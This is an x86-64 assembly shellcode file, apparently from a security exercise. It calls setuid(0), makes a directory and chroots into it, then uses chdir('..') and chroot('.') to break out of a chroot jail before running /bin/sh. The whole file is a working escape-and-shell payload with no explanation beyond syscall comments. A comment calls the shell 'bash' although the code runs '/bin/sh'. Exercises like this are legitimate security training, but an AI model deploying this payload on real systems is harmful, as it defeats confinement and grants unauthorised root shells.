.global _start 
_start:
.intel_syntax noprefix
		# setuid(uid_t uid);
		# rax	System Call	 rdi
		# 105	sys_setuid	 uid_t uid

		mov rax, 105
		xor rdi, rdi
		syscall


		# mkdir("chroot-dir")
		# rax	System Call	   rdi	                  rsi	          
		# 83	sys_mkdir	   const char* pathname	  int mode

		mov rax, 83
		mov rsi, 0x1ed #755
		lea rdi, [rip+chrootdir]
		syscall


		# chroot("chroot-dir")
		# rax	System Call	   rdi	
		# 161	sys_chroot	   const char* filename

		mov rax, 161
		lea rdi, [rip+chrootdir]
		syscall

		# -------------------------------- may need to loop a couple of times ---------------------------------
		# chdir("..")
		# rax	System Call	   rdi	
		# 80	sys_chdir	   const char* filename
		mov rax, 80 
		lea rdi, [rip+chdirtext]
		syscall

		# ------------------------------------------------------------------------------------------------------

		# chroot(".")
		# rax	System Call	   rdi	
		# 161	sys_chroot	   const char* filename
		mov rax, 161
		lea rdi, [rip+chrootext]
		syscall


		# system("/bin/bash")
		# execve(const char *pathname, char *const argv[], char *const envp[]);
		# rax	System Call	   rdi	                 rsi	             rdx
		# 59	sys_execve	   const char* filename	 const char* argv[]	 const char* envp[]

		mov rax, 59 # sys_execve
		mov rsi, 0  # argv is null
		mov rdx, 0  # envp is null
		lea rdi, [rip+binsh]
		syscall


		# exit(int status);
		# rax	System Call	 rdi
		# 60	sys_exit	 int error_code

		mov rax, 60 # sys_exit
		mov rdi, 0 # exit code
		syscall




chrootdir:
		.string "chroot-dir"

chdirtext:
		.string ".."

chrootext:
		.string "."

binsh: 
		.string "/bin/sh"

